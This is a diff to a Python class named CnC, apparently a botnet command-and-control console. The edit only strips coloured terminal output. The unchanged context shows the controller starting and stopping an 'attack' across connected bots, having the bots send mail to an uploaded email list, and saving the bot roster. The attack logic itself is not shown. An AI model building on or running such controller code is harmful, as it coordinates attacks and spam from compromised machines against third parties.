@@ -4,8 +4,6 @@ import socket
 import json
 import threading
 
-from termcolor import colored, cprint
-
 
 class CnC:
     """
@@ -101,7 +99,7 @@ class CnC:
         responses = self.__send_gets('/status')
 
         if responses is None:
-            return colored("No bots connected.", "red")
+            return "No bots connected."
 
         for addr, resp in responses.items():
             status = json.loads(resp.text)
@@ -116,7 +114,7 @@ class CnC:
         res = ""
         responses = self.__send_gets(path, addresses=addresses)
         if responses is None:
-            return colored("No bots connected.", "red")
+            return "No bots connected."
         for addr, resp in responses.items():
             res += f"\nBot {addr}:\n"
 
@@ -124,7 +122,7 @@ class CnC:
                 for k, v in json.loads(resp.text).items():
                     res += f"\t- {k}: {v}\n"
             else:
-                res += colored("\tBot is not connected.\n", "red")
+                res += "\tBot is not connected.\n"
         return res
 
     def __status(self, addresses):
@@ -145,7 +143,7 @@ class CnC:
         """
         with self.__lock:
             if len(self.__bots) == 0:
-                return colored("No bot connected.", 'red')
+                return "No bot connected."
             responses = set()
             for url in urls:
                 responses.union({
@@ -153,8 +151,8 @@ class CnC:
                     for address, port in self.__bots.items()
                 })
         if len(responses) == 1 and responses.pop() != 200:
-            return colored("Attack did not start...", "red")
-        return colored("Attack started successfully!", "green")
+            return "Attack did not start..."
+        return "Attack started successfully!"
 
     def __stop(self):
         """
@@ -163,16 +161,16 @@ class CnC:
         responses = self.__send_gets('/stop')
 
         if responses is None:
-            return colored("No bot connected.", 'red')
+            return "No bot connected."
 
         codes = {r.status_code for r in responses.values()}
 
         if len(codes) != 1:
-            return colored("Attack did not stop...", "red")
+            return "Attack did not stop..."
         code = codes.pop()
         if code == 406:
-            return colored("There isn't any attack running", "yellow")
-        return colored("Attack stopped successfully!", "green")
+            return "There isn't any attack running"
+        return "Attack stopped successfully!"
 
     def __email(self, file):
         """
@@ -180,7 +178,7 @@ class CnC:
         """
         with self.__lock:
             if len(self.__bots) == 0:
-                return colored("No bot connected.", 'red')
+                return "No bot connected."
             with open(file[0], 'r') as f:
                 emails = json.load(f)
             responses = {
@@ -188,8 +186,8 @@ class CnC:
                 for address, port in self.__bots.items()
             }
         if len(responses) == 1 and responses.pop() != 200:
-            return colored("Emails were not sent...", "red")
-        return colored("Emails sent successfully!", "green")
+            return "Emails were not sent..."
+        return "Emails sent successfully!"
 
     def __exit(self) -> str:
         """
@@ -199,7 +197,7 @@ class CnC:
             bots = json.dumps(self.__bots, indent=4)
             with open("bots.json", "w") as f:
                 f.write(bots)
-        return colored("Closing program...", "red")
+        return "Closing program..."
 
     def cli(self):
 
@@ -226,15 +224,15 @@ class CnC:
                 if self.__cmds[cmd]['args']:
                     return self.__cmds[cmd]['fun'](args)
                 else:
-                    return colored("Too many arguments.", 'red')
+                    return "Too many arguments."
             else:
                 cmd = line
                 if self.__cmds[cmd]['args']:
-                    return colored("Too few arguments.", 'red')
+                    return "Too few arguments."
                 else:
                     return self.__cmds[cmd]['fun']()
         except KeyError:
-            return colored("Command not recognized.", 'red')
+            return "Command not recognized."
 
 
 HOST = '127.0.0.1'
